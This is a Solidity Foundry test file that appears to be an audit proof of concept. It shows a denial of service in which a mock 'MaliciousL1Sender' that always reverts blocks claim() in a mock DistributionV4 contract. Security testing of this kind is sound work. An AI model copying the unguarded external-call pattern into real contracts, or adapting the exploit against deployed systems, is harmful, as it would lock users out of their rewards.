// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the L1Sender contract
interface IL1Sender {
    function sendMintMessage() external;
}

// Mock L1Sender contract that always reverts
contract MaliciousL1Sender is IL1Sender {
    function sendMintMessage() external override {
        revert("Malicious revert");
    }
}

// Mock interface for the DistributionV4 contract
interface IDistributionV4 {
    function claim() external;
}

contract ExploitTest is Test {
    // Contract instances
    IDistributionV4 distribution;
    MaliciousL1Sender maliciousL1Sender;

    address owner = address(0x1);
    address user = address(0x2);

    function setUp() public {
        // Deploy the malicious L1Sender contract
        maliciousL1Sender = new MaliciousL1Sender();

        // Deploy the DistributionV4 contract with the malicious L1Sender
        distribution = IDistributionV4(address(new DistributionV4(address(maliciousL1Sender))));

        // Fund the user account
        vm.deal(user, 1 ether);
    }

    function test_exploit() public {
        // Impersonate the user
        vm.prank(user);

        // Attempt to claim rewards, expecting a revert due to the malicious L1Sender
        vm.expectRevert("Malicious revert");
        distribution.claim();

        // Assert that the claim process is blocked, demonstrating the DoS
        // In a real scenario, we would check the user's reward balance or state
        // to ensure it hasn't changed, but here we rely on the revert expectation
    }
}

// Mock implementation of the DistributionV4 contract
contract DistributionV4 is IDistributionV4 {
    IL1Sender public l1Sender;

    constructor(address _l1Sender) {
        l1Sender = IL1Sender(_l1Sender);
    }

    function claim() external override {
        // Simulate the claim process which involves calling the L1Sender
        l1Sender.sendMintMessage();
    }
}